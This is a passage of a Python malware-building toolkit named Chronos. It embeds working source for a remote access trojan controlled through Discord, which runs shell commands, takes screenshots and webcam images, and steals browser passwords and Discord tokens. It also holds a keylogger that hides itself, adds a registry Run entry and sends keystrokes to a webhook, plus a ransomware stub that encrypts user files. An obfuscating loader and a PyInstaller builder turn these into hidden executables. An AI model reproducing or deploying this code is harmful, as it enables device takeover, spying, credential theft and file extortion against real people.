                "Content-Type": "application/json",
                "User-Agent": "DiscordBot (chronos-free, 1.0)",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=15) as resp:
                _rat_log("send: HTTP %s content=%r" % (resp.status, msg[:60]))
                return True
        except Exception as e:
            _rat_log("send FAILED: %s: %s" % (type(e).__name__, e))
            return False
    else:
        chunks = [msg[i:i+1900] for i in range(0, len(msg), 1900)]
        ok = True
        for chunk in chunks:
            if not send_discord(token, channel, chunk, split=False):
                ok = False
        return ok

def send_file_discord(token, channel, file_data, filename):
    try:
        boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdef0123456789", k=16))
        # payload_json optional caption
        payload = json.dumps({"content": "File: %s" % filename})
        parts = []
        parts.append(("--%s\r\n" % boundary).encode())
        parts.append(b'Content-Disposition: form-data; name="payload_json"\r\nContent-Type: application/json\r\n\r\n')
        parts.append(payload.encode() + b"\r\n")
        parts.append(("--%s\r\n" % boundary).encode())
        parts.append(('Content-Disposition: form-data; name="file"; filename="%s"\r\n' % filename).encode())
        parts.append(b"Content-Type: application/octet-stream\r\n\r\n")
        parts.append(file_data)
        parts.append(b"\r\n")
        parts.append(("--%s--\r\n" % boundary).encode())
        body = b"".join(parts)
        headers = {
            "Authorization": "Bot %s" % token,
            "Content-Type": "multipart/form-data; boundary=%s" % boundary,
            "User-Agent": "DiscordBot (chronos-free, 1.0)",
        }
        req = urllib.request.Request(
            "https://discord.com/api/v9/channels/%s/messages" % channel,
            data=body,
            headers=headers,
            method="POST",
        )
        with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=60) as resp:
            _rat_log("send_file: HTTP %s file=%s size=%d" % (resp.status, filename, len(file_data)))
            return True
    except Exception as e:
        _rat_log("send_file FAILED: %s: %s" % (type(e).__name__, e))
        return False

# ---- RAT Core ----
class LimitedRAT:
    def __init__(self, token, channel, prefix, whitelist):
        self.token = (token or "").strip()
        self.channel = str(channel or "").strip()
        self.prefix = (prefix or "!").strip() or "!"
        self.whitelist = whitelist
        self.running = True
        self.processed = set()
        _rat_log("LimitedRAT init channel=%s prefix=%s token_len=%d" % (self.channel, self.prefix, len(self.token)))
        ok = send_discord(self.token, self.channel, "Chronos RAT Online - %s" % socket.gethostname())
        _rat_log("online message send result=%s" % ok)

    def is_authorized(self, author_id):
        return str(author_id) in self.whitelist if self.whitelist else True

    def send(self, msg, split=False):
        send_discord(self.token, self.channel, msg, split)

    def send_file(self, file_data, filename):
        return send_file_discord(self.token, self.channel, file_data, filename)

    def poll(self):
        while self.running:
            try:
                _rat_log("poll: tick channel=%s processed=%d" % (self.channel, len(self.processed)))
                req = urllib.request.Request(
                    "https://discord.com/api/v9/channels/%s/messages?limit=5" % self.channel,
                    headers={
                        "Authorization": "Bot %s" % self.token,
                        "User-Agent": "DiscordBot (chronos-free, 1.0)",
                    },
                )
                with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=15) as resp:
                    raw = resp.read().decode()
                    status = resp.status
                _rat_log("poll: HTTP %s bytes=%d" % (status, len(raw)))
                if status != 200:
                    _rat_log("poll: body=%s" % raw[:300])
                    time.sleep(10)
                    continue
                data = json.loads(raw)
                if not isinstance(data, list):
                    _rat_log("poll: unexpected type %s" % type(data).__name__)
                    time.sleep(10)
                    continue
                _rat_log("poll: got %d messages" % len(data))
                for msg in data:
                    mid = msg.get("id")
                    if mid in self.processed:
                        continue
                    self.processed.add(mid)
                    author = msg.get("author", {})
                    author_id = author.get("id")
                    if author.get("bot"):
                        continue
                    if not self.is_authorized(author_id):
                        _rat_log("poll: skipped non-whitelist %s" % author_id)
                        continue
                    text = (msg.get("content") or "").strip()
                    _rat_log("poll: seen msg from %s content=%r" % (author_id, text[:80]))
                    if text.startswith(self.prefix):
                        cmd = text[len(self.prefix):].strip()
                        _rat_log("poll: dispatch cmd=%r" % cmd)
                        try:
                            self.execute(cmd, msg)
                        except Exception as e:
                            _rat_log("poll: execute error %s: %s" % (type(e).__name__, e))
                            self.send("Error: %s" % e)
            except Exception as e:
                _rat_log("poll EXCEPTION: %s: %s" % (type(e).__name__, e))
            time.sleep(10)

    def execute(self, cmd_str, msg):
        parts = cmd_str.split()
        if not parts:
            return
        command = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        if command == "help":
            self.send(
                "COMMANDS\n"
                "========\n"
                "help - this list\n"
                "info - system info\n"
                "shutdown / restart / bsod / lock\n"
                "msgbox <text>\n"
                "cmd <command>\n"
                "list - list files\n"
                "launch <app>\n"
                "processes / processkill <name>\n"
                "startup - add persistence\n"
                "screenshot / webcam\n"
                "passwords / discord / steal_all\n"
                "kill - exit RAT"
            )
        elif command == "info":
            info = get_sysinfo()
            text = "SYSTEM INFO\n" + "="*50 + "\n"
            for k, v in info.items():
                text += f"{k}: {v}\n"
            self.send(text)
        elif command == "shutdown":
            self.send("Shutting down...")
            os.system("shutdown /s /t 3 /f")
        elif command == "restart":
            self.send("Restarting...")
            os.system("shutdown /r /t 3 /f")
        elif command == "bsod":
            self.send("Triggering BSOD...")
            try:
                ntdll = ctypes.windll.ntdll
                old = ctypes.c_bool()
                ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(old))
                ntdll.NtRaiseHardError(0xC0000005, 0, 0, None, 6, None)
            except:
                pass
        elif command == "lock":
            try:
                ctypes.windll.user32.LockWorkStation()
                self.send("Workstation locked.")
            except:
                self.send("Lock failed")
        elif command == "msgbox":
            if args:
                try:
                    msg_text = " ".join(args)
                    ctypes.windll.user32.MessageBoxW(0, msg_text, "Chronos RAT", 0)
                    self.send("Message box displayed.")
                except:
                    self.send("Message box failed")
            else:
                self.send("Usage: msgbox <text>")
        elif command == "cmd":
            if args:
                try:
                    result = subprocess.check_output(" ".join(args), shell=True, stderr=subprocess.STDOUT, text=True)
                    self.send(f"CMD: {' '.join(args)}\n{result[:1800]}")
                except subprocess.CalledProcessError as e:
                    self.send(f"CMD error: {e.output}")
            else:
                self.send("Usage: cmd <command>")
        elif command == "list":
            path = args[0] if args else "C:\\"
            try:
                result = f"DIR: {path}\n"
                for entry in os.listdir(path)[:50]:
                    full = os.path.join(path, entry)
                    result += f"[{'DIR' if os.path.isdir(full) else 'FILE'}] {entry}\n"
                self.send(result)
            except Exception as e:
                self.send(f"List error: {str(e)}")
        elif command == "launch":
            if args:
                try:
                    subprocess.Popen(args[0], creationflags=0x08000000)
                    self.send(f"Launched: {args[0]}")
                except:
                    self.send("Launch failed")
            else:
                self.send("Usage: launch <path>")
        elif command == "processes":
            self.send(get_processes())
        elif command == "processkill":
            if args:
                self.send(kill_process(args[0]))
            else:
                self.send("Usage: processkill <pid>")
        elif command == "startup":
            self.send(get_startup_items())
        elif command == "screenshot":
            path = take_screenshot()
            if path:
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    ok = self.send_file(data, "screenshot.png")
                    try:
                        os.remove(path)
                    except Exception:
                        pass
                    if ok:
                        self.send("Screenshot uploaded (%d bytes)." % len(data))
                    else:
                        self.send("Screenshot taken but upload failed. Check rat_debug.log")
                except Exception as e:
                    self.send("Screenshot error: %s" % e)
            else:
                self.send("Screenshot failed.")
        elif command == "webcam":
            path = take_webcam()
            if path:
                with open(path, 'rb') as f:
                    self.send_file(f.read(), "webcam.jpg")
                os.remove(path)
                self.send("Webcam captured.")
            else:
                self.send("Webcam failed (cv2 missing or no camera).")
        elif command == "passwords":
            try:
                pw = steal_passwords()
                if len(pw) < 1900:
                    self.send(pw)
                else:
                    chunks = [pw[i:i+1900] for i in range(0, len(pw), 1900)]
                    for i, c in enumerate(chunks):
                        self.send("PASSWORDS Part %d/%d\n%s" % (i+1, len(chunks), c))
            except Exception as e:
                self.send("Error: %s" % e)
        elif command == "discord":
            try:
                dk = steal_discord_tokens()
                if len(dk) < 1900:
                    self.send(dk)
                else:
                    chunks = [dk[i:i+1900] for i in range(0, len(dk), 1900)]
                    for i, c in enumerate(chunks):
                        self.send("DISCORD Part %d/%d\n%s" % (i+1, len(chunks), c))
            except Exception as e:
                self.send("Error: %s" % e)
        elif command == "steal_all":
            self.send("Starting full steal...")
            try:
                pw = steal_passwords()
                self.send(pw if len(pw) < 1900 else pw[:1900] + "\n[truncated]")
                if len(pw) >= 1900:
                    chunks = [pw[i:i+1900] for i in range(0, len(pw), 1900)]
                    for i, c in enumerate(chunks):
                        self.send("PASSWORDS Part %d/%d\n%s" % (i+1, len(chunks), c))
                dk = steal_discord_tokens()
                self.send(dk if len(dk) < 1900 else dk[:1900] + "\n[truncated]")
                if len(dk) >= 1900:
                    chunks = [dk[i:i+1900] for i in range(0, len(dk), 1900)]
                    for i, c in enumerate(chunks):
                        self.send("DISCORD Part %d/%d\n%s" % (i+1, len(chunks), c))
            except Exception as e:
                self.send("Steal error: %s" % e)
        elif command == "kill":
            self.send("Self-destructing...")
            try:
                exe = os.path.abspath(sys.argv[0]) if getattr(sys, 'frozen', False) else sys.executable
                bat = f"@echo off\ntimeout /t 2 > nul\ndel /f /q \"{exe}\"\ndel %~f0"
                with open(os.path.join(tempfile.gettempdir(), "del.bat"), 'w') as f:
                    f.write(bat)
                subprocess.Popen(["del.bat"], creationflags=0x08000000)
                os._exit(0)
            except:
                os._exit(0)
        else:
            self.send(f"Unknown command: {command}")

if __name__ == "__main__":
    try:
        _rat_log("entering main()")
        time.sleep(random.randint(1, 3))
        whitelist = [uid.strip() for uid in WHITELIST.split(",") if uid.strip()] if WHITELIST else []
        _rat_log("main: creating LimitedRAT")
        rat = LimitedRAT(BOT_TOKEN, CHANNEL_ID, COMMAND_PREFIX, whitelist)
        _rat_log("main: entering poll loop")
        rat.poll()
    except Exception as e:
        _rat_log("FATAL in main: %s: %s" % (type(e).__name__, e))
        try:
            import traceback
            _rat_log(traceback.format_exc())
        except Exception:
            pass
'''
# ============================================================================
# STUB_KEYLOGGER – FULL (FREE this is shit i'ma update it later)
# ============================================================================
STUB_KEYLOGGER = r'''
import os
import sys
import time
import requests
import platform
import ctypes
from datetime import datetime
from pathlib import Path
def add_to_startup():
    try:
        import winreg
        script_path = os.path.abspath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "WindowsSystemUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)
    except:
        pass
add_to_startup()
WEBHOOK_URL = "REPLACE_WITH_WEBHOOK"
if platform.system() == "Windows":
    LOG_FILE = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "system32.ini"
else:
    LOG_FILE = Path("/tmp/.systemd-log")
current_line = ""
last_key = None
last_key_time = 0
KEY_DELAY = 0.15
def hide_console():
    if platform.system() == "Windows":
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass
hide_console()
def send_to_discord(text):
    if "REPLACE_WITH_WEBHOOK" in WEBHOOK_URL or WEBHOOK_URL == "":
        save_locally(text)
        return
    try:
        if len(text) > 2000:
            text = text[:1997] + "..."
        payload = {
            "content": f"```\n{text}\n```",
            "username": "Key Logger",
            "avatar_url": "https://media1.tenor.com/m/va4X22k9bMUAAAAd/roblox-da-hood.gif"
        }
        response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        if response.status_code not in [200, 204]:
            save_locally(text)
    except:
        save_locally(text)
def save_locally(text):
    try:
        with open(LOG_FILE, "a", encoding="utf-8", errors="ignore") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {text}\n")
    except:
        pass
class WindowsKeylogger:
    def __init__(self):
        self.running = True
        self.current_line = ""
        self.last_key_time = 0
        self.last_key = None
    def get_key(self):
        try:
            user32 = ctypes.windll.user32
            VK_SHIFT = 0x10
            VK_CONTROL = 0x11
            VK_MENU = 0x12
            VK_CAPITAL = 0x14
            VK_RETURN = 0x0D
            VK_BACK = 0x08
            VK_TAB = 0x09
            VK_ESCAPE = 0x1B
            VK_SPACE = 0x20
            def is_key_pressed(key):
                return bool(user32.GetAsyncKeyState(key) & 0x8000)
            if is_key_pressed(VK_CONTROL) and is_key_pressed(0x51):
                self.running = False
                return None
            current_time = time.time()
            for key in range(8, 255):
                if is_key_pressed(key):
                    if key == self.last_key and (current_time - self.last_key_time) < KEY_DELAY:
                        return None
                    if key == self.last_key and (current_time - self.last_key_time) < 0.2:
                        return None
                    self.last_key = key
                    self.last_key_time = current_time
                    if key == VK_RETURN:
                        return "ENTER"
                    elif key == VK_BACK:
                        return "BACKSPACE"
                    elif key == VK_TAB:
                        return "TAB"
                    elif key == VK_ESCAPE:
                        return "ESC"
                    elif key == VK_SPACE:
                        return " "
                    shift = is_key_pressed(VK_SHIFT)
                    caps = is_key_pressed(VK_CAPITAL)
                    if 0x30 <= key <= 0x39:
                        chars = ")!@#$%^&*(" if shift else "0123456789"
                        idx = key - 0x30
                        return chars[idx] if idx < len(chars) else str(key - 0x30)
                    elif 0x41 <= key <= 0x5A:
                        char = chr(key)
                        if shift or caps:
                            return char.upper()
                        return char.lower()
                    elif 0xBA <= key <= 0xC0:
                        special = {
                            0xBA: (";", ":"),
                            0xBB: ("=", "+"),
                            0xBC: (",", "<"),
                            0xBD: ("-", "_"),
                            0xBE: (".", ">"),
                            0xBF: ("/", "?"),
                            0xC0: ("`", "~"),
                        }
                        if key in special:
                            return special[key][1] if shift else special[key][0]
                        return None
            return None
        except:
            return None
    def run(self):
        while self.running:
            try:
                key = self.get_key()
                if key is None:
                    time.sleep(0.01)
                    continue
                if key == "ENTER":
                    if self.current_line.strip():
                        send_to_discord(self.current_line.strip())
                        save_locally(self.current_line.strip())
                    self.current_line = ""
                elif key == "BACKSPACE":
                    if self.current_line:
                        self.current_line = self.current_line[:-1]
                else:
                    self.current_line += key
            except:
                time.sleep(0.01)
def main():
    if platform.system() != "Windows":
        return
    try:
        keylogger = WindowsKeylogger()
        keylogger.run()
    except:
        pass
if __name__ == "__main__":
    main()
'''
# ============================================================================
# STUB_RANSOMWARE – FULL (FREE) DO NOT USE THIS IT SENDS THE DECRIPTION KEY TO THE VICTIM POC ONLY
# ============================================================================
STUB_RANSOMWARE = r'''
"""
CHRONOS RANSOMWARE – Standalone File Encryptor
===============================================
Encrypts user files and sends decryption key to webhook.
"""
import os, sys, time, random, string, base64, json, requests, platform, socket
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import ctypes
WEBHOOK_URL = "REPLACE_WITH_WEBHOOK"
TARGET_FOLDERS = ["Documents", "Desktop", "Pictures", "Music", "Videos", "Downloads"]
EXTENSIONS = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.zip', '.rar', '.py', '.js', '.html']
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
def generate_key():
    return os.urandom(32)
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv=os.urandom(16))
        ct = cipher.encrypt(pad(data, AES.block_size))
        with open(file_path + '.encrypted', 'wb') as f:
            f.write(cipher.iv + ct)
        os.remove(file_path)
        return True
    except:
        return False
def drop_ransom_note(key_hex):
    note = f"""YOUR FILES HAVE BEEN ENCRYPTED!
Decryption key: {key_hex}
Send this key to the attacker (or pay ransom) to recover your files.
Contact: chronos@example.com
"""
    desktop = os.path.join(os.path.expanduser('~'), 'Desktop', 'READ_ME.txt')
    try:
        with open(desktop, 'w') as f:
            f.write(note)
    except:
        pass
def main():
    key = generate_key()
    key_hex = key.hex()
    encrypted_count = 0
    for folder in TARGET_FOLDERS:
        folder_path = os.path.join(os.path.expanduser('~'), folder)
        if os.path.exists(folder_path):
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                        full = os.path.join(root, file)
                        if encrypt_file(full, key):
                            encrypted_count += 1
    drop_ransom_note(key_hex)
    info = f"Ransomware executed on {socket.gethostname()} ({platform.system()})\nEncrypted {encrypted_count} files.\nKey: {key_hex}"
    try:
        requests.post(WEBHOOK_URL, json={"content": info[:2000]})
    except:
        pass
    try:
        ctypes.windll.user32.MessageBoxW(0, "Your files have been encrypted!\nCheck READ_ME.txt on Desktop.", "Chronos Ransomware", 0)
    except:
        pass
if __name__ == "__main__":
    time.sleep(random.randint(2,5))
    main()
'''
# ============================================================================
# # OBFUSCATOR – fixed (FREE) shit aswell
# ============================================================================
class UltimateObfuscator:
    def __init__(self, filename):
        with open(filename, "r", encoding="utf-8") as f:
            self.code = f.read()
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
        self.PY_VERSION = sys.version_info[:2]
    def _rand_ident(self, prefix="_", length=8):
        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return prefix + "".join(random.choice(alphabet) for _ in range(length))
    def _split(self, data, parts):
        out = [os.urandom(len(data)) for _ in range(parts - 1)]
        last = bytearray(data)
        for p in out:
            last = bytearray(a ^ b for a, b in zip(last, p))
        out.append(bytes(last))
        return out
    def _transform(self):
        tree = ast.parse(self.code)
        vc = self._VariableCollector()
        vc.visit(tree)
        for t in (
            self._ControlFlowFlattener(),
            self._VariableRenamer(vc.assigned, vc.args, vc.globals),
            self._StringEncryptor(self.key),
        ):
            tree = t.visit(tree)
        ast.fix_missing_locations(tree)
        return marshal.dumps(compile(tree, "<obf>", "exec"))
    class _VariableCollector(ast.NodeVisitor):
        def __init__(self):
            self.assigned = set()
            self.globals = set()
            self.args = set()
        def visit_Global(self, node):
            self.globals.update(node.names)
        def visit_Name(self, node):
            if isinstance(node.ctx, ast.Store):
                self.assigned.add(node.id)
        def visit_arg(self, node):
            self.args.add(node.arg)
            self.assigned.add(node.arg)
    class _VariableRenamer(ast.NodeTransformer):
        def __init__(self, assigned, args, globals_):
            self.rename = set(assigned) - set(args) - set(globals_)
            self.map = {}
        def _new(self, name):
            return "v_" + hashlib.shake_128(name.encode()).hexdigest(8)
        def visit_Name(self, node):
            if node.id in self.rename:
                if node.id not in self.map:
                    self.map[node.id] = self._new(node.id)
                node.id = self.map[node.id]
            return node
    class _ControlFlowFlattener(ast.NodeTransformer):
        SAFE_INIT_LOCALS = False
        BLOCKED = (
            ast.Return, ast.Yield, ast.YieldFrom, ast.Try, ast.With,
            ast.Break, ast.Continue, ast.AsyncFunctionDef, ast.Global, ast.Nonlocal,
        )
        def visit_FunctionDef(self, node):
            self.generic_visit(node)
            if any(isinstance(n, self.BLOCKED) for n in ast.walk(node)):
                return node
            if any(isinstance(n, ast.FunctionDef) for n in node.body):
                return node
            original = list(node.body)
            if not original:
                return node
            state = f"_st_{random.randint(1000, 9999)}"
            new_body = [
                ast.Assign(targets=[ast.Name(state, ast.Store())], value=ast.Constant(0))
            ]
            while_body = []
            for i, stmt in enumerate(original):
                while_body.append(
                    ast.If(
                        test=ast.Compare(ast.Name(state, ast.Load()), [ast.Eq()], [ast.Constant(i)]),
                        body=[stmt, ast.AugAssign(ast.Name(state, ast.Store()), ast.Add(), ast.Constant(1))],
                        orelse=[]
                    )
                )
            new_body.append(
                ast.While(
                    test=ast.Compare(ast.Name(state, ast.Load()), [ast.Lt()], [ast.Constant(len(original))]),
                    body=while_body,
                    orelse=[]
                )
            )
            new_body.append(ast.Return(ast.Constant(None)))
            node.body = new_body
            return node
    class _StringEncryptor(ast.NodeTransformer):
        def __init__(self, key):
            self.key = key
            self.in_fstring = False
        def visit_JoinedStr(self, node):
            self.in_fstring = True
            self.generic_visit(node)
            self.in_fstring = False
            return node
        def _encrypt(self, data: bytes):
            iv = os.urandom(16)
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return iv + cipher.encrypt(pad(data, 16))
        def visit_Constant(self, node):
            if self.in_fstring:
                return node
            if isinstance(node.value, str):
                enc = self._encrypt(node.value.encode())
                return ast.Call(ast.Name("_decrypt_str", ast.Load()), [ast.Constant(enc)], [])
            if isinstance(node.value, (bytes, bytearray)):
                enc = self._encrypt(bytes(node.value))
                return ast.Call(ast.Name("_decrypt_bytes", ast.Load()), [ast.Constant(enc)], [])
            return node
    def build(self, output):
        payload = zlib.compress(self._transform(), 9)
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        encrypted = cipher.encrypt(pad(payload, 16))
        payload_b85 = base64.b85encode(encrypted).decode("ascii")
        k_parts = self._split(self.key, 3)
        iv_parts = self._split(self.iv, 2)
        loader = f'''
# ==========================
# ObfuXtreme v4 Loader
# ==========================
import sys
import base64
import marshal
import zlib
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
except ModuleNotFoundError:
    print("[FATAL] Missing dependency: pycryptodome")
    print("Install with: python -m pip install pycryptodome")
    sys.exit(1)
EXPECTED_PY = {self.PY_VERSION}
if sys.version_info[:2] != EXPECTED_PY:
    print("[FATAL] Unsupported Python version")
    print(f"Expected: {{EXPECTED_PY[0]}}.{{EXPECTED_PY[1]}}")
    print(f"Found:    {{sys.version_info[0]}}.{{sys.version_info[1]}}")
    sys.exit(1)
def _xor(parts):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), parts)
_KEY = _xor({k_parts!r})
_IV  = _xor({iv_parts!r})
def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_KEY, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")
def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_KEY, AES.MODE_CBC, iv).decrypt(p), 16)
_enc = base64.b85decode({payload_b85!r})
plain = unpad(AES.new(_KEY, AES.MODE_CBC, _IV).decrypt(_enc), 16)
exec(
    marshal.loads(zlib.decompress(plain)),
    {{
        "__name__": "__main__",
        "__builtins__": __builtins__,
        "_decrypt_str": _decrypt_str,
        "_decrypt_bytes": _decrypt_bytes,
    }}
)
'''
        with open(output, 'w', encoding='utf-8') as f:
            f.write(loader)
        print(f"{Colors.GREEN}[✓] Obfuscated script saved to {output}{Colors.RESET}")
# ============================================================================
# BUILDER CLASS – with better error logging and increased timeout
# ============================================================================
class Builder:
    def __init__(self):
        self.output_dir = Path("output")
        self.output_dir.mkdir(exist_ok=True)
    def _compile(self, stub_code: str, name: str, console: bool, icon: bool, silent: bool, replacements: dict):
        try:
            import PyInstaller.__main__ as _pyi_main
        except ImportError:
            print(Colors.RED + "[X] PyInstaller is not available in this build." + Colors.RESET)
            return False

        # Replace placeholders
        for k, v in replacements.items():
            v_escaped = v.replace('\\', '\\\\').replace('"', '\\"')
            v_escaped = v_escaped.replace('\x00', '')
            stub_code = stub_code.replace(k, v_escaped)
            stub_code = stub_code.replace('\x00', '')
        
        temp_stub = self.output_dir / f"{name}_stub_temp.py"
        with open(temp_stub, 'w', encoding='utf-8') as f:
            f.write(stub_code)

        args = [
            "--onefile",
            "--noconfirm",
            "--clean",
            "--distpath", str(Path("dist").resolve()),
            "--workpath", str(Path("build").resolve()),
            "--specpath", str(Path(".").resolve()),
            "--name", name,
        ]
        args.extend([
            "--hidden-import=requests",
            "--hidden-import=win32crypt",
            "--hidden-import=Crypto",
            "--hidden-import=Crypto.Cipher.AES",
            "--hidden-import=PIL",
            "--hidden-import=PIL.ImageGrab",
            "--hidden-import=encodings",
            "--hidden-import=codecs",
            "--hidden-import=encodings.utf_8",
            "--hidden-import=encodings.ascii",
            "--hidden-import=encodings.latin_1",
        ])
        args.append("--collect-all=encodings")
        if not console:
            args.append("--noconsole")
        if icon and os.path.exists("icon.ico"):
            args.extend(["--icon", "icon.ico"])
        args.append(str(temp_stub.resolve()))

        print(Colors.GRAY + "    pyinstaller " + " ".join(args[:-1]) + " <stub>" + Colors.RESET)

        try:
            _pyi_main.run(args)
        except SystemExit as e:
            if e.code not in (0, None):
                print(Colors.RED + f"[X] PyInstaller exited with code {e.code}" + Colors.RESET)
                return False
        except Exception as e:
            print(Colors.RED + f"[X] PyInstaller raised: {type(e).__name__}: {e}" + Colors.RESET)
            return False

        dist_exe = Path("dist") / f"{name}.exe"
        try:
            if dist_exe.exists():
                shutil.copy2(dist_exe, self.output_dir / f"{name}.exe")
                shutil.rmtree("build", ignore_errors=True)
                shutil.rmtree("dist", ignore_errors=True)
                if temp_stub.exists():
                    temp_stub.unlink()
                return True
            else:
                print(Colors.RED + f"[X] Compilation finished but {dist_exe} not found." + Colors.RESET)
                return False
        except Exception as e:
            print(Colors.RED + f"[X] Post-compile step failed: {type(e).__name__}: {e}" + Colors.RESET)
            return False
    # ---- Builder methods ----
    def build_grabber(self):
        clear_screen()
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        print(Colors.CYAN + "        BUILD GRABBER (full stealer, ZIP exfil)" + Colors.RESET)
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        default_webhook = "https://discord.com/api/webhooks/your_webhook_id/your_token"
        default_name = "grabber"
        default_console = "N"
        default_icon = "N"
        default_silent = "Y"
        print(f"\n{Colors.GRAY}Defaults: webhook={default_webhook}, name={default_name}, console={default_console}, icon={default_icon}, silent={default_silent}{Colors.RESET}")
        webhook = input(Colors.CYAN + f"Webhook URL [{default_webhook}]: " + Colors.RESET).strip()
        if not webhook:
            webhook = default_webhook
        name = input(Colors.CYAN + f"Output name [{default_name}]: " + Colors.RESET).strip()
        if not name:
            name = default_name
        console_in = input(Colors.CYAN + f"Show console? (Y/N) [{default_console}]: " + Colors.RESET).strip().upper()
        if console_in not in ("Y", "N"):
            console_in = default_console
        console = (console_in == "Y")
        icon_in = input(Colors.CYAN + f"Use icon.ico? (Y/N) [{default_icon}]: " + Colors.RESET).strip().upper()
        if icon_in not in ("Y", "N"):
            icon_in = default_icon
        icon = (icon_in == "Y")
        silent_in = input(Colors.CYAN + f"Silent mode (hide all windows)? (Y/N) [{default_silent}]: " + Colors.RESET).strip().upper()
        if silent_in not in ("Y", "N"):
            silent_in = default_silent
        silent = (silent_in == "Y")
        print(Colors.YELLOW + "\n[*] Building grabber..." + Colors.RESET)
        replacements = {"REPLACE_WITH_WEBHOOK": webhook}
        success = self._compile(STUB_GRABBER, name, console, icon, silent, replacements)
        if success:
            print(Colors.GREEN + f"[V] Grabber built: {self.output_dir}/{name}.exe" + Colors.RESET)
        else:
            print(Colors.RED + "[X] Build failed." + Colors.RESET)
        pause()
    def build_rat(self):
        clear_screen()
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        print(Colors.CYAN + "        BUILD RAT (essential commands only)" + Colors.RESET)
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        default_token = "your_bot_token"
        default_channel = "your_channel_id"
        default_name = "rat"
        default_console = "N"
        default_icon = "N"
        default_silent = "Y"
        default_prefix = "!"
        default_whitelist = ""
        print(f"\n{Colors.GRAY}Defaults: token={default_token}, channel={default_channel}, name={default_name}, console={default_console}, icon={default_icon}, silent={default_silent}, prefix={default_prefix}, whitelist={default_whitelist}{Colors.RESET}")
        bot_token = input(Colors.CYAN + f"Bot Token [{default_token}]: " + Colors.RESET).strip()
        if not bot_token:
            bot_token = default_token
        channel = input(Colors.CYAN + f"Channel ID [{default_channel}]: " + Colors.RESET).strip()
        if not channel:
            channel = default_channel
        name = input(Colors.CYAN + f"Output name [{default_name}]: " + Colors.RESET).strip()
        if not name:
            name = default_name
        console_in = input(Colors.CYAN + f"Show console? (Y/N) [{default_console}]: " + Colors.RESET).strip().upper()
        if console_in not in ("Y", "N"):
            console_in = default_console
        console = (console_in == "Y")
        icon_in = input(Colors.CYAN + f"Use icon.ico? (Y/N) [{default_icon}]: " + Colors.RESET).strip().upper()
        if icon_in not in ("Y", "N"):
            icon_in = default_icon
        icon = (icon_in == "Y")
        silent_in = input(Colors.CYAN + f"Silent mode (hide all windows)? (Y/N) [{default_silent}]: " + Colors.RESET).strip().upper()
        if silent_in not in ("Y", "N"):
            silent_in = default_silent
        silent = (silent_in == "Y")
        prefix = input(Colors.CYAN + f"Command prefix [{default_prefix}]: " + Colors.RESET).strip()
        if not prefix:
            prefix = default_prefix
        whitelist = input(Colors.CYAN + f"Whitelist user IDs (comma-separated, leave empty for none) [{default_whitelist}]: " + Colors.RESET).strip()
        if not whitelist:
            whitelist = default_whitelist
        print(Colors.YELLOW + "\n[*] Building RAT..." + Colors.RESET)
        replacements = {
            "REPLACE_WITH_BOT_TOKEN": bot_token,
            "REPLACE_WITH_CHANNEL_ID": channel,
            "REPLACE_WITH_PREFIX": prefix,
            "REPLACE_WITH_WHITELIST": whitelist
        }
        success = self._compile(STUB_RAT, name, console, icon, silent, replacements)
        if success:
            print(Colors.GREEN + f"[V] RAT built: {self.output_dir}/{name}.exe" + Colors.RESET)
        else:
            print(Colors.RED + "[X] Build failed." + Colors.RESET)
        pause()
    def build_keylogger(self):
        clear_screen()
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        print(Colors.CYAN + "        BUILD KEYLOGGER (standalone, webhook logs)" + Colors.RESET)
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        default_webhook = "https://discord.com/api/webhooks/your_webhook_id/your_token"
        default_name = "keylogger"
        default_console = "N"
        default_icon = "N"
        default_silent = "Y"
        print(f"\n{Colors.GRAY}Defaults: webhook={default_webhook}, name={default_name}, console={default_console}, icon={default_icon}, silent={default_silent}{Colors.RESET}")
